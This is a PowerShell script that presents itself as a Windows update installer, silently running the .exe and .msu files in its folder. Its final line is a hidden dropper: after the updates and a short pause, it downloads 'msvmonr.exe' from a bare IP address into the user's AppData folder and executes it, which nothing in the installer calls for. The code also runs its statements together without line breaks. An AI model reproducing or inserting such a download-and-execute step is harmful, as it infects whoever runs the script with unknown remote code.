function Install-EXEUpdates {Set-Variable -Name Arguments -Scope Local -ForceSet-Variable -Name ErrCode -Scope Local -ForceSet-Variable -Name File -Scope Local -ForceSet-Variable -Name EXEFiles -Scope Local -ForceSet-Variable -Name RelativePath -Scope Local -Force$RelativePath = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"$EXEFiles = Get-ChildItem -Path $RelativePath -Force | where { $_.Name -like "*.exe*" }If ($EXEFiles.Count -ge 1) {$EXEFiles | Sort-Objectclsforeach ($File in $EXEFiles) {$Arguments = "/passive /norestart"Write-Host "Installing"$File.Name"....." -NoNewline$ErrCode = (Start-Process -FilePath $File.Fullname -ArgumentList $Arguments -Wait -Passthru).ExitCodeIf ($ErrCode -eq 0) {Write-Host "Success" -ForegroundColor Yellow} else {Write-Host "Failed with error code"$ErrCode -ForegroundColor Red}}}Remove-Variable -Name Arguments -Scope Local -ForceRemove-Variable -Name ErrCode -Scope Local -ForceRemove-Variable -Name File -Scope Local -ForceRemove-Variable -Name EXEFiles -Scope Local -ForceRemove-Variable -Name RelativePath -Scope Local -Force}function Install-MSUUpdates {Set-Variable -Name Arguments -Scope Local -ForceSet-Variable -Name ErrCode -Scope Local -ForceSet-Variable -Name Executable -Value $env:windir"\System32\wusa.exe" -Scope Local -ForceSet-Variable -Name File -Scope Local -ForceSet-Variable -Name MSUFiles -Scope Local -ForceSet-Variable -Name RelativePath -Scope Local -Force$RelativePath = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + "\"$MSUFiles = Get-ChildItem -Path $RelativePath -Force | where { $_.Name -like "*.msu*" }If ($MSUFiles.Count -ge 1) {$MSUFiles | Sort-Objectclsforeach ($File in $MSUFiles) {$Arguments = $File.FullName + [char]32 + "/quiet /norestart"Write-Host "Installing"$File.Name"....." -NoNewline$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Arguments -Wait -Passthru).ExitCodeIf (($ErrCode -eq 0) -or ($ErrCode -eq 2359302)) {Write-Host "Success" -ForegroundColor Yellow} else {Write-Host "Failed with error code"$ErrCode -ForegroundColor Red}}}Remove-Variable -Name Arguments -Scope Local -ForceRemove-Variable -Name ErrCode -Scope Local -ForceRemove-Variable -Name Executable -Scope Local -ForceRemove-Variable -Name File -Scope Local -ForceRemove-Variable -Name MSUFiles -Scope Local -ForceRemove-Variable -Name RelativePath -Scope Local -Force}clsInstall-EXEUpdatesInstall-MSUUpdatesStart-Sleep -Seconds 5(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")